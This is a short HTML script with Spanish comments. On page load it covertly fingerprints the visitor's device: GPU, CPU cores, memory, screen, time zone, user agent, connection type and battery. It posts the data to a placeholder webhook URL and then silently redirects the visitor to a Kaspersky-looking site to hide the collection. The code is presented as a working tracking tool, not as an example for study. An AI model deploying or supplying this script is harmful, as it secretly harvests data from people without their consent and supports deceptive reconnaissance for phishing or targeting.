<script>
    // Función para obtener información detallada de la tarjeta gráfica (GPU)
    function getGPU() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return "No disponible";
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "No disponible";
        } catch (e) { return "Error al leer GPU"; }
    }

    // Recopilación de metadatos del sistema sin permisos avanzados
    const infoDispositivo = {
        plataforma: navigator.platform,
        idioma: navigator.language,
        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
        nucleosCPU: navigator.hardwareConcurrency || "Oculto",
        memoriaRAM: navigator.deviceMemory ? navigator.deviceMemory + " GB aproximados" : "Oculto",
        pantallaAncho: window.screen.width,
        pantallaAlto: window.screen.height,
        tarjetaGrafica: getGPU(),
        navegador: navigator.userAgent,
        tipoConexion: navigator.connection ? navigator.connection.effectiveType : "No disponible"
    };

    // Intento de leer el estado de la batería si el navegador lo permite
    if (navigator.getBattery) {
        navigator.getBattery().then(function(battery) {
            infoDispositivo.bateriaNivel = (battery.level * 100) + "%";
            infoDispositivo.estaCargando = battery.charging ? "Sí" : "No";
            enviarDatos();
        }).catch(() => { enviarDatos(); });
    } else {
        enviarDatos();
    }

    // Función para enviar todo el paquete de datos recolectados al Webhook
    function enviarDatos() {
        fetch('TU_URL_DE_WEBHOOK_AQUÍ', {
            method: 'POST',
            mode: 'no-cors', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(infoDispositivo)
        }).then(() => {
            // Redirección imperceptible a la infografía de Kaspersky
            window.location.href = "https://kaspersky-labs.com";
        }).catch(() => {
            window.location.href = "https://kaspersky-labs.com";
        });
    }
</script>
